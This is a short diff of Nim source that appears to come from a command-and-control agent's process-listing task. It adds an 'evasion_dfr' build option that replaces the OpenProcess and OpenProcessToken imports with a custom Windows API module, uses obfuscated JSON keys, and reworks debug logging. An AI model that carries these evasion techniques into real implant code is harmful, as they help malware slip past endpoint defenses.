@@ -13,7 +13,11 @@ type
     command_line: string
 
 when defined(windows):
-  import winim
+  when defined(evasion_dfr):
+    import winim except OpenProcess, OpenProcessToken
+    import ../utils/winapi
+  else:
+    import winim
   import std/widestrs
   
   proc getProcessUser(hProcess: HANDLE): string =
@@ -177,7 +181,7 @@ when not defined(windows):
           continue
 
 proc ps*(params: string): JsonNode =
-  debug "[DEBUG] Getting process list"
+  debugLog "ps", "Getting process list"
   
   try:
     when defined(windows):
@@ -206,7 +210,7 @@ proc ps*(params: string): JsonNode =
       obf("processes"): processesJson
     }
     
-    debug &"[DEBUG] Found {processes.len} processes"
+    debugLog "ps", &"Found {processes.len} processes"
     
     return %*{
       obf("task_id"): "",  # Will be set by agent
